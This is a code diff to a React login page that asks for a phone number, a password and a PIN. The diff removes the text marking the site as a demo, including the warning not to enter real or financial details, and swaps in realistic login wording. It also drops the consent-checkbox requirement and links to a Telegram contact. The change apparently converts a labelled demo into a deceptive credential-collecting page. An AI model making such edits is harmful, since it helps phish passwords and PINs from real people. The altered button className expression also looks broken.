@@ -38,14 +38,14 @@ export default function Home() {
           <input id="address" placeholder="Please enter your password" maxLength={250}
             value={address} onChange={e => setAddress(e.target.value)} />
         </div>
-        <button id="loginBtn" className={phone.length === 10 && address.trim() && agree ? "active" : ""}
+        <button id="loginBtn" className={phone.length === 10 && address.trim()}
           onClick={continueToPin}>CONTINUE</button>
         <div className="policy">
           <input id="agree" type="checkbox" checked={agree} onChange={e => setAgree(e.target.checked)} />
-          <label className="policy-text" htmlFor="agree">I understand this is a demo and will use test details only.</label>
+          <label className="policy-text" htmlFor="agree">By logging in you agree to our Privacy policy.</label>
         </div>
         {error && <div className="form-error">{error}</div>}
-        <p className="demo-note">Demo website: do not enter private, financial, or real account information.</p>
+        <p className="demo-note">Create new account</p>
         <a className="telegram" href="https://t.me/sprodealin" target="_blank" rel="noreferrer" aria-label="Telegram">
           <i className="fa-brands fa-telegram"></i>
         </a>
